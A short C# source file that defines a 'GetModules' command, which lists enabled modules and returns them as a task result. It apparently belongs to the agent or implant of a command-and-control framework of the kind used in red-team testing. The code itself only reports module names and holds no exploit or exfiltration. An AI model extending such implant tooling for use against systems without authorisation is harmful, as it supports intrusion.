using DynamicEngLoading;
using Engineer.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace Engineer.Commands
{
    internal class GetModules : EngineerCommand
    {
        public override string Name => "GetModules";

        public override async Task Execute(EngineerTask task)
        {
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.AppendLine("Modules:");
           foreach(Type moduleType in Program.typesWithModuleAttribute)
            {
                stringBuilder.AppendLine(moduleType.Name + " : " + "Enabled");
            }
            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(stringBuilder.ToString(), task, EngTaskStatus.Complete, TaskResponseType.String);
        }
    }
}
